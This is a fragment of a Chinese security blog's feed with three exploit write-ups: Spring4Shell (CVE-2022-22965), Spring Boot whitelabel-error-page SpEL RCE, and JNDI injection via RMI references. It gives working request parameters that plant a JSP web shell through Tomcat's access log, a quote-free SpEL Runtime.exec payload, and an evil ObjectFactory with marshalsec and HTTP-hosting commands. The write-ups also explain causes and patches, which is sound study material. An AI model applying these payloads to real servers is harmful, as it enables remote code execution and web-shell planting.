+<p>可以发现依次调用了JavaBean的getter然后再利用setter绑定参数，在setter打上断点</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/6.png" class="" title="image-20220609101101241">
+<p>参数绑定的方法是<code>org.springframework.web.bind.WebDataBinder#doBind()</code>，然后调用<strong>spring-bean</strong>的PropertyAccessor来进行绑定</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/7.png" class="" title="image-20220609101814524">
+<p>然后使用了PropertyDescriptor的子类来获取JavaBean的getter/setter</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/8.png" class="" title="image-20220609102434936">
+<p>最后在<code>org.springframework.beans.BeanWrapperImpl</code>反射调用setter完成绑定参数</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/9.png" class="" title="image-20220609102558500">
+<h3 id="Tomcat-AccessLogValve">Tomcat AccessLogValve</h3>
+<p>在tomcat/conf/server.xml定义了访问日志的valve，定义了生成访问日志的有关信息</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/10.png" class="" title="image-20220609103123906">
+<h2 id="漏洞复现-2">漏洞复现</h2>
+<p><strong>重写configure方法</strong>，按照利用条件：jdk11+maven打包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.example.springcorerce;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.boot.builder.SpringApplicationBuilder;</span><br><span class="line">import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;</span><br><span class="line"></span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class SpringCoreRceApplication extends SpringBootServletInitializer &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class="line">        return builder.sources(SpringCoreRceApplication.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        SpringApplication.run(SpringCoreRceApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将war包放入tomcat的webapps目录，启动tomcat</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/11.png" class="" title="image-20220609104428607">
+<p>然后向Controller依次GET传参，这是修改日志存储路径然后写shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69</span><br><span class="line">?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp</span><br><span class="line">?class.module.classLoader.resources.context.parent.pipeline.first.directory=.</span><br><span class="line">?class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp</span><br><span class="line">?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br></pre></td></tr></table></figure>
+<p>然后再随便发送一个请求，header携带键fxxk，值为<code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;))%&gt;</code>写jsp，然后一个shell就在ROOT下生成了</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/12.png" class="" title="image-20220609105615496">
+<p>可以直接<code>URL/fxxkJsp.jsp</code>访问，完成写马</p>
+<h3 id="脚本">脚本</h3>
+<p>自动化，操作一样</p>
+<blockquote>
+<p><a href="https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/main/poc.py">https://github.com/BobTheShoplifter/Spring4Shell-POC/blob/main/poc.py</a></p>
+</blockquote>
+<h2 id="代码审计-4">代码审计</h2>
+<h3 id="动态调试WAR包配置">动态调试WAR包配置</h3>
+<p>在tomcat的catalina.bat添加参数<code>set JPDA_ADDRESS=xxx</code>作为远程调试端口号</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/13.png" class="" title="image-20220609110708486">
+<p>然后启动tomcat添加参数<code>catalina.bat jpda start</code>开启调试</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/14.png" class="" title="image-20220609110834907">
+<p>然后回到idea源代码项目，配置，选择Remote JVM Debug然后如图配置，端口号同上</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/15.png" class="" title="image-20220609111017597">
+<p>然后启动Debug，如果连接上了会有提示</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/16.png" class="" title="image-20220609111122897">
+<h3 id="绑定流程">绑定流程</h3>
+<p>传参<code>?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69</code></p>
+<p>在doBind设置断点，向Controller携带任意参数，被捕获</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/17.png" class="" title="image-20220609111734962">
+<p>首先：AbstractPropertyAccessor.setPropertyValues()利用迭代器依次绑定多个参数，这里只有一个</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/18.png" class="" title="image-20220609113414546">
+<p>然后进行递归获取每个部分</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/19.png" class="" title="image-20220609113832806">
+<p>在<code>this.NestedPropertyAccessor</code>调用了getter/setter</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/20.png" class="" title="image-20220609114133043">
+<h3 id="原理分析">原理分析</h3>
+<p><strong>根据上面的前置知识：观察payload是修改了class属性，而bean是没有携带任何属性！但是在BeanWrapperImpl处理的时候却是带有一个class属性的！</strong></p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/21.png" class="" title="image-20220609112148904">
+<p><strong>spring为了方便引用待绑定类会带一个class属性</strong></p>
+<p>那么根据上面的分析：<strong>绑定参数会调用getter/setter，那么修改class参数就能直接调用getClass()获取到一个<code>java.lang.Class</code>对象进而完成其他操作了！</strong></p>
+<p>最后绑定调用setter，因此来搞日志写shell</p>
+<img src="/2022/06/05/Springboot/CVE-2022-22965-Spring4Shell/22.png" class="" title="image-20220609112547192">
+<ol>
+<li class="lvl-3">
+<p>pattern: 日志内容，支持参数解析</p>
+</li>
+<li class="lvl-3">
+<p>suffix: 日志文件后缀名</p>
+</li>
+<li class="lvl-3">
+<p>directory: 日志存储路径，当前为webapps/ROOT，能够直接URL访问到</p>
+</li>
+<li class="lvl-3">
+<p>prefix: 日志名前缀</p>
+</li>
+<li class="lvl-3">
+<p>fileDateFormat: 日志携带日期格式，置空不设置时间</p>
+</li>
+</ol>
+<h2 id="关键点">关键点</h2>
+<h3 id="jdk9">jdk9</h3>
+<p>9+提供了Class.getModule()方法</p>
+<h3 id="war包部署">war包部署</h3>
+<p>war包部署，在调用Module.getClassLoader时：加载的是<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>，它拥有getResources()方法，而jar包部署调用的是LaunchedURLClassLoader没有getter</p>
+<h3 id="引入spring-bean">引入spring-bean</h3>
+<p>为了调用bean getter/setter</p>
+<h2 id="补丁修复">补丁修复</h2>
+<h3 id="Spring-5-3-18">Spring 5.3.18</h3>
+<p>只能获取Class.name或者是Name开头的属性</p>
+<h3 id="Tomcat-9-0-62">Tomcat 9.0.62</h3>
+<p>ParallelWebappClassLoader.getResource()返回值为null</p>
+<h2 id="参考-3">参考</h2>
+<blockquote>
+<p><a href="https://tanzu.vmware.com/security/cve-2022-22965">https://tanzu.vmware.com/security/cve-2022-22965</a></p>
+<p><a href="https://paper.seebug.org/1877/">https://paper.seebug.org/1877/</a></p>
+<p>p1n93r师傅的pdf</p>
+</blockquote>
+<h2 id="完-7">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Springboot</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>springboot</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Springboot whitelabel errorpage SPEL RCE</title>
+    <url>/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/</url>
+    <content><![CDATA[<h2 id="漏洞简介-3">漏洞简介</h2>
+<p>向一个可以能引发报错的controller传参，报错时会渲染出报错页面对输入的参数SPEL解析</p>
+<h2 id="影响范围-2">影响范围</h2>
+<p>Springboot: 1.1.0 ~ 1.1.12、1.2.0 ~ 1.2.7、1.3.0</p>
+<span id="more"></span>
+<h2 id="漏洞复现-3">漏洞复现</h2>
+<p>新建Springboot项目，设置为受影响的版本</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/1.png" class="">
+<p>编写一个通过输入能抛出错误的controller</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbooterrorpagerce;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">inject</span><span class="params">(String spel)</span>&#123;</span><br><span class="line">        Integer.parseInt(spel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>传入SPEL表达式触发注入</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/2.png" class="">
+<h3 id="RCE注意事项">RCE注意事项</h3>
+<p>这里SPEL表达式是不能含有单双引号的，否则无法RCE，因此在exec的时候需要绕过：将引号字符串换成ascii表示</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x65</span>,<span class="number">0x6e</span>,<span class="number">0x20</span>,<span class="number">0x2d</span>,<span class="number">0x61</span>,<span class="number">0x20</span>,<span class="number">0x43</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x72</span>&#125;))&#125;</span><br></pre></td></tr></table></figure>
+<p>ascii转换：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;open -a Calculator&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="代码审计-5">代码审计</h2>
+<p>从报错页面渲染开始，在org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/3.png" class="">
+<p>this.template是报错页面的模板，渲染该页面是通过SPEL表达式解析来达到参数替换</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Whitelabel Error Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>This application has no explicit mapping for /error, so you are seeing this as a fallback.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;created&#x27;</span>&gt;</span>$&#123;timestamp&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>this.replacePlaceholders方法传入模板和占位符解析器来渲染页面，来到<code>PropertyPlaceHolderHelper#parseStringValue</code>方法</p>
+<p>首先会对模板的所有被<code>$&#123;&#125;</code>包裹的占位符进行一层<code>$&#123;&#125;</code>去除，然后再递归去除多重包裹</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/4.png" class="">
+<p>获取占位符</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/5.png" class="">
+<p>获取到占位符就去解析对应的值</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/6.png" class="">
+<p>第一个被解析的是timestamp，这里用的是SPEL的解析器</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/7.png" class="">
+<p>占位符解析成功后，接着又会对解析出来的值再一次进行递归去除<code>$&#123;&#125;</code>+SPEL解析</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/8.png" class="">
+<p>同理，当解析最后一个占位符message时，<strong>先从模板递归+SPEL解析出占位符message的值，然后又对message的值递归+SPEL解析</strong></p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/9.png" class="">
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/10.png" class="">
+<p>就在此时解析了可控输入产生漏洞</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/11.png" class="">
+<h2 id="POP链-3">POP链</h2>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/12.png" class="">
+<h2 id="漏洞修复">漏洞修复</h2>
+<p>漏洞产生是由于先从模板递归+SPEL解析出占位符message的值，然后又对message的值递归+SPEL解析，<strong>两次操作使用的是同一个方法</strong>，而本质上只需要在从模板中解析占位符时候调用SPEL，无需对值进行解析</p>
+<p>因此官方在1.3.1版本更新了一个无递归解析的<code>NonRecursivePropertyPlaceholderHelper</code></p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/13.png" class="">
+<p>调用它的parseStringValue方法，然后再调用resolvePlaceholder方法时就会直接返回null而不会递归+SPEL解析</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/14.png" class="">
+<p>那么我们在<code>resolvePlaceholder()</code>处打断点：</p>
+<p>在从模板解析<code>$&#123;message&#125;</code>时：<code>this.resolver</code>不是<code>NonRecursivePropertyPlaceholderHelper</code>因此调用SPEL解析，解析结果是我们的传参字符串<code>$&#123;7*8&#125;</code></p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/15.png" class="">
+<p>解析字符串<code>$&#123;7*8&#125;</code>时发现是<code>NonRecursivePropertyPlaceholderHelper</code>因此返回null</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/16.png" class="">
+<p>返回null就不会进行递归解析了</p>
+<img src="/2022/06/02/Springboot/Springboot-whitelabel-error-page-spel-RCE/17.png" class="">
+<p>更新后把模板占位符和具体替换值分开操作而不公用同一个方法，仅对占位符进行解析而不解析具体值，从而避免了非法注入</p>
+<h2 id="参考-4">参考</h2>
+<blockquote>
+<p><a href="https://www.cnblogs.com/litlife/p/10183137.html">https://www.cnblogs.com/litlife/p/10183137.html</a></p>
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce">https://github.com/LandGrey/SpringBootVulExploit#0x01whitelabel-error-page-spel-rce</a></p>
+</blockquote>
+<h2 id="完-8">完</h2>
+<blockquote>
+<p>版权属于：Ho1aAs<br>
+欢迎关注我的博客 ：<a href="https://holaasuka.github.io">https://holaasuka.github.io</a><br>
+版权声明：本文为原创，来源于上述网站，转载时须注明出处及本声明</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Springboot</category>
+      </categories>
+      <tags>
+        <tag>Java安全</tag>
+        <tag>springboot</tag>
+        <tag>spel注入</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>低版本JNDI注入原理和手段探究</title>
+    <url>/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/</url>
+    <content><![CDATA[<h2 id="版本限制">版本限制</h2>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/1.png" class="">
+<span id="more"></span>
+<h2 id="恶意RMI-Remote类（应用受限）">恶意RMI Remote类（应用受限）</h2>
+<h3 id="原理-2">原理</h3>
+<p>codebase是一个URL、引导JVM查找类的地址</p>
+<p>Client在lookup加载过程中会先在本地寻找Stub类，如果没有找到就向codebase远程加载Stub类。</p>
+<p>若设置codebase为<code>http://foo.com</code>，加载<code>com.test.Test</code>类时便会下载<code>http://foo.com/com/test/Test.class</code></p>
+<p>那么只要<strong>控制Server端的codebase（修改Client端的codebase地址）</strong>，就能给Client完成注入。</p>
+<h3 id="注入步骤">注入步骤</h3>
+<ol>
+<li class="lvl-5">
+<p>攻击者将恶意Remote对象绑定到Server端的Registry</p>
+</li>
+<li class="lvl-5">
+<p>Remote类放在服务器上，然后设置Server端的codebase地址（java.rmi.server.codebase属性）</p>
+</li>
+<li class="lvl-5">
+<p>Client在lookup时找不到该类就会向远程codebase加载恶意Remote对象</p>
+</li>
+</ol>
+<h3 id="限制">限制</h3>
+<p>官方基于此攻击手法设置了防御手段，必须满足以下条件才能完成攻击：</p>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>java.rmi.server.useCodebaseOnly为false</p>
+</li>
+</ul>
+<blockquote>
+<p>从<strong>5u45、6u45、7u21、8u121</strong>开始，java.rmi.server.useCodebaseOnly的默认值就是true。当该值为true时，将<strong>禁用自动加载远程类文件</strong>，仅从CLASSPATH和<strong>当前VM</strong>的java.rmi.server.codebase 指定路径加载类文件。</p>
+</blockquote>
+<p>这种方法用途不是很广</p>
+<h2 id="恶意ObjectFactory工厂类">恶意ObjectFactory工厂类</h2>
+<p>JNDI通过对象工厂（ObjectFactory）来实现动态加载对象</p>
+<blockquote>
+<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。</p>
+<p>绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+</blockquote>
+<p>创建对象工厂需要实现ObjectFactory接口的getObjectInstance方法，在这个方法中插入恶意代码即可</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection.evilObjectFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilObjectFactory</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="RMI-Reference">RMI + Reference</h3>
+<h4 id="原理-3">原理</h4>
+<p>给RMIServer绑定Reference对象，当RMIClient获取这个对象发现是Reference类型时、若允许远程加载便会加载恶意对象工厂调用getObjectInstance方法</p>
+<blockquote>
+<p>攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类，但是原理上并非使用RMI Class Loading机制的，因此不受 java.rmi.server.useCodebaseOnly 系统属性的限制</p>
+</blockquote>
+<p>攻击者扮演Server端，受害者正常扮演Client端</p>
+<h4 id="代码实现">代码实现</h4>
+<p>攻击者首先给RMIServer绑定恶意对象工厂，Reference需要wrapper转换成可以绑定的对象。该而对象工厂需要提前编译为class文件，在新建Reference对象时通过URL索引，这里用file协议</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;JNDIInjection.evilObjectFactory.EvilObjectFactory&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;file://C:\\xxx\\EvilObjectFactory.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(className, className, url);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;hacked&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1/hacked is working...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>受害者是Client端，lookup即触发RCE</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDIInjection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;rmi://127.0.0.1/hacked&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/2.png" class="">
+<h5 id="marshalsec构建恶意rmi服务">marshalsec构建恶意rmi服务</h5>
+<p>把编写的恶意对象工厂的包名去掉，编译为class文件</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/3.png" class="">
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/<span class="comment">#EvilObjectFactoryExploit 6666</span></span><br></pre></td></tr></table></figure>
+<p>然后起一个http server在80端口，把这个恶意工厂放上去</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure>
+<p>受害者lookup任意name都能触发</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/4.png" class="">
+<h4 id="限制-2">限制</h4>
+<blockquote>
+<p>JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</p>
+</blockquote>
+<ul class="lvl-0">
+<li class="lvl-3">
+<p>客户端<code>com.sun.jndi.rmi.object.trustURLCodebase</code>设置为true</p>
+</li>
+</ul>
+<h4 id="debug追函数">debug追函数</h4>
+<p>追一下lookup函数，在GenericURLContext中，来到了var3.lookup()</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/5.png" class="">
+<p>然后调用了var3的this.registry.lookup，这个函数与Server完成交互与反序列化操作，最后调用了decodeObject</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/6.png" class="">
+<p>decodeObject对绑定了Reference且信任远程codebase时：调用了NamingManager的getObjectInstance</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/7.png" class="">
+<p>如果Reference有工厂类，那么<strong>实例化该工厂类、调用我们重写的getObjectInstance方法</strong></p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/8.png" class="">
+<p>最后就来到了RCE部分（由于是本机debug可以追到这个地方）</p>
+<img src="/2022/05/29/JNDI%E6%B3%A8%E5%85%A5/%E4%BD%8E%E7%89%88%E6%9C%ACJNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%92%8C%E6%89%8B%E6%AE%B5%E6%8E%A2%E7%A9%B6/9.png" class="">
+<h4 id="调用链">调用链</h4>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InitialContext.lookup()</span><br><span class="line">GenericURLContext.lookup()</span><br><span class="line">RegistryContext.lookup()</span><br><span class="line">RegistryContext.decodeObject()</span><br><span class="line">NamingManager.getObjectInstance()</span><br><span class="line">EvilObjectFactory.getObjectInstance()</span><br></pre></td></tr></table></figure>
